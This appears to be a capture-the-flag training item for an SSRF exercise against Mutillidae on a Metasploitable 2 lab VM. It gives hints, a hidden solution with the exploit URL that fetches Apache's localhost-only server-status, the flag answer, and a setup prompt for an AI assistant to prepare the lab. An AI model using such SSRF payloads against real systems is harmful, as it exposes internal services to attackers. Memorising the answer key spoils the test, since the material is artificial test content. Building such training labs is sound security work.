# Q083 — SSRF via URL Param (Mutillidae)

| Field | Value |
|---|---|
| **Target** | `192.168.52.129` (Metasploitable 2) |
| **Domain** | 12 — Web Apps / 13 — SQLi |
| **Difficulty** | 🔴 Hard |
| **Tools** | `curl` |
| **Time budget** | 15–25 min |

---

## 📝 Question

Mutillidae's URL fetch page can be abused for SSRF. Provide an internal URL that retrieves Apache server status.

---

## 🎯 Flag Format

```
url=<url>
```

Example: `url=http://127.0.0.1/server-status`

**⚠️ Format strict hai** — lowercase, no spaces around `=`, semicolon separator where shown.

---

## 💡 Hints

<details>
<summary>Hint 1 (click)</summary>

Server-side fetches whatever URL given.
</details>

<details>
<summary>Hint 2</summary>

Try internal-only paths.
</details>

---

## ✅ Solution

<details>
<summary>Show solution</summary>

```bash
# http://192.168.52.129/mutillidae/index.php?page=ssrf.php&url=http://127.0.0.1/server-status
```

Returns localhost-only Apache status.

**Answer:** `url=http://127.0.0.1/server-status`

📖 Ref: [playbooks/webapp-playbook.md](../../playbooks/webapp-playbook.md)
</details>

---

## 🤖 Claude Setup Prompt (for Claude-on-your-PC)

```
Pre-requisites for Q083:
1. Verify Metasploitable2 up; Mutillidae reachable with DB initialized.
2. On Metasploitable2 Apache, mod_status enabled for localhost (default): ssh msfadmin → curl http://127.0.0.1/server-status — should return Apache status (if not, enable with 'a2enmod status' then restart apache2).

Report back: "Lab ready for Q083 — Mutillidae reachable, local /server-status enabled".
```
